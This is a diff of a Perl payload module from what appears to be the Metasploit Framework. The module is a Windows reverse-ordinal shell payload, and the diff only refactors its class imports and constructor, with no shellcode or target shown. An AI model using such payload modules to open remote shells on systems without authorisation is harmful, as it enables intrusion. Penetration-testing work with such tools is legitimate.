@@ -8,14 +8,9 @@
 ##
 
 package Msf::Payload::win32_reverse_ord;
+
 use strict;
-use base 'Msf::PayloadComponent::Win32PipedShellStage';
-sub _Load {
-  Msf::PayloadComponent::Win32PipedShellStage->_Import(
-    'Msf::PayloadComponent::Win32ReverseOrdinalStager'
-  );
-  __PACKAGE__->SUPER::_Load();
-}
+use base 'Msf::PayloadComponent::Windows::ia32::PipedShellStage';
 
 my $info =
 {
@@ -25,13 +20,25 @@ my $info =
   'Authors'      => [ 'spoonm <ninjatools [at] hush.com>', ],
 };
 
-sub new {
-  _Load();
-  my $class = shift;
-  my $hash = @_ ? shift : { };
-  $hash = $class->MergeHashRec($hash, {'Info' => $info});
-  my $self = $class->SUPER::new($hash, @_);
-  return($self);
+sub _Load 
+{
+	Msf::PayloadComponent::Windows::ia32::PipedShellStage->_Import('Msf::PayloadComponent::Windows::ia32::ReverseOrdinalStager');
+
+	__PACKAGE__->SUPER::_Load();
+}
+
+sub new 
+{
+	my $class = shift;
+	my $hash = @_ ? shift : { };
+	my $self;
+
+	_Load();
+
+	$hash = $class->MergeHashRec($hash, {'Info' => $info});
+	$self = $class->SUPER::new($hash, @_);
+
+	return($self);
 }
 
 1;
